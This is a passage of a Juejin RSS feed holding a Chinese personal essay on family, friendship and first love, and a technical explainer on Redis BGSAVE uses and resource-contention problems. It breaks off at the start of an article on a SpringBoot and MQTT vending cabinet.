<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[生活]]></title>    <link>https://juejin.cn/post/7549378194212503579</link>    <guid>https://juejin.cn/post/7549378194212503579</guid>    <pubDate>2025-09-15T02:50:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7549378194212503579" data-draft-id="7549613377195343918" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="生活"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-09-15T02:50:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_山止川行"/> <meta itemprop="url" content="https://juejin.cn/user/2569995609450827"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            生活
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2569995609450827/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _山止川行
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-09-15T02:50:28.000Z" title="Mon Sep 15 2025 02:50:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-09-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    45
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2a3620836944b5caa028f5edf222824~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-WxseatouW3neihjA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765254893&amp;x-signature=pDJLleAupQfpmqlH8v6W5Iini2k%3D" alt="67000d15-ccaf-46e2-a548-a017fd8ed8d2_1757904478446930297_origin~tplv-a9rns2rl98-web-preview-watermark.jpeg" loading="lazy"/></p>
<p>暮色漫过窗台时，我总爱翻外婆留下的旧木盒。里面没有贵重物件，只有几张泛黄的照片、半块压得紧实的桂花糕，还有一沓写满娟秀字迹的信。那些被时光揉皱的情感，藏在字里行间、食物余温里，轻轻触碰，就会漫出温热的香气。​</p>
<p>外婆的信里总提桂花。她说后院的桂花树又开了，风一吹，花瓣落在晾衣绳上，连衣服都带着甜。每年重阳节，她会摘下最新鲜的桂花，和着糯米粉蒸糕。我总等在灶台边，看她把蒸好的糕切成小块，裹上一层白糖。“慢些吃，别烫着”，她的声音裹着水汽，和桂花的香气一起，成了我童年最暖的底色。后来我去外地读书，她寄来的桂花糕总用油纸仔细包着，拆开时，甜味里还带着她手心的温度。那些年的信，写满了 “天凉加衣”“别省着花钱”，没有华丽的词藻，却藏着最朴素的牵挂 —— 原来亲情从不是轰轰烈烈的誓言，而是藏在日复一日的惦念里，像桂花糕的甜，绵长又安心。​</p>
<p>去年冬天，我在医院陪护生病的朋友。她化疗后头发掉光，却笑着说要学织围巾。我们坐在病房的窗边，她笨手笨脚地绕线，线团滚到地上，两人笑得眼泪都出来。有天夜里她疼得睡不着，我陪她看窗外的雪，她轻声说：“幸好有你在。” 那一刻我忽然明白，友情不是锦上添花的热闹，而是雪中送炭的陪伴。就像寒夜里的一杯热茶，不用多说什么，递过去的温度，就是最好的安慰。后来她康复了，送给我一条歪歪扭扭的围巾，毛线的颜色不太均匀，却成了我最珍贵的礼物 —— 那里面织着我们一起熬过的寒冬，藏着彼此扶持的温柔。​</p>
<p>也曾在青春里遇见一场心动。那年夏天，我们在图书馆靠窗的位置一起复习。他总把风扇往我这边推，自己额头上满是汗。高考结束那天，他送我一本笔记本，扉页上写着 “愿你去往的地方，都是阳光”。后来我们去了不同的城市，联系渐渐少了，但每次看到那本笔记本，心里还是会泛起暖意。原来爱情不一定非要走到最后，那些并肩走过的时光，那些藏在细节里的温柔，早已成为生命里闪亮的片段，在回忆里发光。​</p>
<p>生活就像一本厚厚的书，每一页都写着不同的情感。有亲情的牵挂，有友情的陪伴，有爱情的温柔。这些情感藏在时光的褶皱里，或许不显眼，却总能在某个瞬间，给我们温暖和力量。就像外婆的桂花糕，朋友的围巾，少年的笔记本，它们带着情感的温度，在岁月里静静沉淀，成为我们生命中最珍贵的宝藏。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis-bgsave浅析]]></title>    <link>https://juejin.cn/post/7554270339796877350</link>    <guid>https://juejin.cn/post/7554270339796877350</guid>    <pubDate>2025-09-27T07:08:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7554270339796877350" data-draft-id="7554270339796844582" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis-bgsave浅析"/> <meta itemprop="keywords" content="后端,Redis"/> <meta itemprop="datePublished" content="2025-09-27T07:08:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Penge666"/> <meta itemprop="url" content="https://juejin.cn/user/1549628692501449"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis-bgsave浅析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1549628692501449/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Penge666
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-09-27T07:08:34.000Z" title="Sat Sep 27 2025 07:08:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-09-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    51
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">什么是bgsave？</h2>
<p>BGSAVE 是 Redis 用于生成 RDB 持久化文件的核心操作，它的本质是：</p>
<ul>
<li>主线程 fork 一个<strong>子进程</strong>，子进程会独立遍历 Redis 内存数据，将其序列化并写入磁盘（生成.rdb 文件）；</li>
<li>整个过程中，主线程完全不参与数据遍历，仍能正常处理业务请求。</li>
</ul>
<h2 data-id="heading-1">什么时候会用到bgsave？</h2>
<h3 data-id="heading-2">定期备份</h3>
<p>定期备份策略</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生产环境典型备份计划</span>
0 2 * * * /usr/local/bin/redis-backup.sh  <span class="hljs-comment"># 每天凌晨2点执行</span>

<span class="hljs-comment"># 备份脚本示例</span>
<span class="hljs-comment">#!/bin/bash</span>
redis-cli BGSAVE
wait_for_bgsave_complete
<span class="hljs-built_in">cp</span> /var/lib/redis/dump.rdb /backup/redis/dump-$(<span class="hljs-built_in">date</span> +%Y%m%d).rdb
</code></pre>
<p><strong>适用场景</strong>：</p>
<ul>
<li>数据库每日/每周全量备份</li>
<li>灾备恢复准备</li>
<li>数据迁移前的快照</li>
</ul>
<h3 data-id="heading-3">数据迁移</h3>
<pre><code class="hljs language-javascript" lang="javascript">源服务器：
redis-cli <span class="hljs-variable constant_">BGSAVE</span>
scp dump.<span class="hljs-property">rdb</span> <span class="hljs-keyword">new</span>-<span class="hljs-attr">server</span>:<span class="hljs-regexp">/path/</span>to/redis/

目标服务器：
systemctl stop redis
cp dump.<span class="hljs-property">rdb</span> /<span class="hljs-keyword">var</span>/lib/redis/
systemctl start redis
</code></pre>
<h3 data-id="heading-4">故障排查与数据分析</h3>
<pre><code class="hljs language-scss" lang="scss"># 使用RDB文件进行分析
redis-cli BGSAVE
# 等待完成后使用工具分析
rdb <span class="hljs-attr">--command</span> memory dump<span class="hljs-selector-class">.rdb</span> <span class="hljs-attr">--bytes</span> <span class="hljs-number">128</span> <span class="hljs-attr">--largest</span> <span class="hljs-number">10</span> <span class="hljs-comment">// 大key分析</span>
</code></pre>
<p><strong>分析场景</strong>：</p>
<ul>
<li>查找内存泄漏原因</li>
<li>分析大Key分布</li>
<li>优化数据结构设计</li>
</ul>
<h3 data-id="heading-5">AOF重写机制</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># AOF重写内部流程</span>
<span class="hljs-bullet">1.</span> redis-cli BGREWRITEAOF
<span class="hljs-bullet">2.</span> Redis执行fork()创建子进程
<span class="hljs-bullet">3.</span> 子进程基于当前数据生成新的AOF文件
<span class="hljs-bullet">4.</span> 实际上就是执行了一次BGSAVE+命令回放
</code></pre>
<p>** AOF重写 = BGSAVE + 命令回放**</p>
<h3 data-id="heading-6">主从复制初始化</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 新从节点加入集群时</span>
主节点流程：
<span class="hljs-bullet">1.</span> 接收到SLAVEOF命令
<span class="hljs-bullet">2.</span> 执行BGSAVE创建RDB快照
<span class="hljs-bullet">3.</span> 将RDB文件发送给从节点
<span class="hljs-bullet">4.</span> 从节点加载RDB完成初始化
</code></pre>
<h2 data-id="heading-7">bgsave会存在哪些问题？</h2>
<p>GSAVE 会导致 “业务抖动” 和 “实例抖动”。</p>
<p>BGSAVE 虽然不阻塞主线程，但会占用大量<strong>系统资源（CPU、内存、磁盘 IO）</strong> ，这些资源抢占会间接影响 Redis 服务和依赖它的业务，具体体现在三个方面：</p>
<h3 data-id="heading-8">1. CPU 抢占</h3>
<p><strong>CPU 抢占：导致业务请求响应变慢（业务抖动）</strong></p>
<p>BGSAVE 子进程的核心工作是 “遍历内存数据 + 序列化 + 写磁盘”，这三个步骤都需要消耗 CPU。比如：子进程要把一个 1GB 的哈希表序列化到磁盘，需要持续占用 CPU 进行数据结构解析和二进制编码 —— 如果单机 CPU 是 4 核，子进程可能会占用 1 核的 80% 以上资源。</p>
<p>而 Redis 主线程（处理业务请求）也需要 CPU：比如执行<code>HGET user:100 name</code>需要解析 key、查找哈希表、返回结果。当子进程抢占大量 CPU 时，主线程能拿到的 “CPU 时间片” 会减少，直接导致：</p>
<ul>
<li>正常情况下 1<del>2ms 就能响应的请求，延迟可能飙升到 10</del>20ms；</li>
<li>高并发场景（如每秒 10 万请求）下，部分请求会因超时被业务端重试，甚至返回失败 —— 这就是 “业务请求抖动”。</li>
</ul>
<h3 data-id="heading-9">2. 内存复制</h3>
<p><strong>内存复制：可能触发 “内存交换”（Redis 实例抖动）</strong></p>
<p>BGSAVE 子进程创建时，会用到 Linux 的<strong>写时复制（Copy-On-Write，COW）</strong>  机制，这个机制是为了 “节省内存”，但也可能引发新问题。</p>
<p>COW 的逻辑是：</p>
<ul>
<li>子进程刚创建时，不直接拷贝主线程的内存数据，而是和主线程共享同一块内存；</li>
<li>只有当主线程修改某块内存（比如执行<code>SET key new_val</code>）时，系统才会 “复制” 这块内存的旧版本给子进程（确保子进程能拿到修改前的数据，生成一致快照）。</li>
</ul>
<p>如果 Redis 内存占用很高（比如 16GB 内存用了 14GB），且 BGSAVE 期间有大量写操作（比如每秒 1 万次<code>SET</code>），会发生什么？</p>
<ul>
<li>大量内存被 “复制”：主线程每修改一块内存，就会生成一份副本，导致系统可用内存骤降；</li>
<li>触发 Swap（内存交换）：当可用内存不足时，操作系统会把部分内存数据写到磁盘的 “交换分区”（Swap 分区），而磁盘 IO 速度比内存慢 1000 倍以上；</li>
<li>Redis 实例卡顿：主线程要读取被交换到磁盘的数据时，需要等待磁盘 IO，响应延迟会从毫秒级变成百毫秒级，甚至出现 “实例短暂无响应”—— 这就是 “Redis 服务实例抖动”。</li>
</ul>
<h3 data-id="heading-10">3. 磁盘 IO 抢占</h3>
<p><strong>磁盘 IO 抢占：拖慢 AOF 持久化（雪上加霜）</strong></p>
<p>如果你的 Redis 同时开启了 AOF 持久化（<code>AppendOnly yes</code>，生产环境大多会开），BGSAVE 还会和 AOF 抢占磁盘 IO 资源。</p>
<p>AOF 的逻辑是：主线程执行修改命令后，会把命令写入 AOF 缓冲区，再由后台线程定期将缓冲区内容刷到磁盘（默认每秒一次，<code>appendfsync everysec</code>）。</p>
<p>而 BGSAVE 子进程需要把 16GB 的内存数据写入磁盘（生成.rdb 文件），会占用大量磁盘写 IO—— 比如原本 AOF 刷盘每秒只需要 10MB IO，BGSAVE 执行时磁盘写 IO 可能飙升到 100MB/s，导致：</p>
<ul>
<li>AOF 刷盘延迟：原本 1ms 能完成的刷盘，变成 20ms；</li>
<li>主线程等待刷盘：如果 AOF 缓冲区满了，主线程会暂时阻塞等待刷盘完成，进一步加剧业务请求延迟。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot + MQTT 如何实现取货就走的智能售货柜系统]]></title>    <link>https://juejin.cn/post/7579093412332109834</link>    <guid>https://juejin.cn/post/7579093412332109834</guid>    <pubDate>2025-12-03T01:19:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579093412332109834" data-draft-id="7572455881029861385" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot + MQTT 如何实现取货就走的智能售货柜系统"/> <meta itemprop="keywords" content="Java,后端"/> <meta itemprop="datePublished" content="2025-12-03T01:19:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="刘大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot + MQTT 如何实现取货就走的智能售货柜系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    刘大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-03T01:19:19.000Z" title="Wed Dec 03 2025 01:19:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul 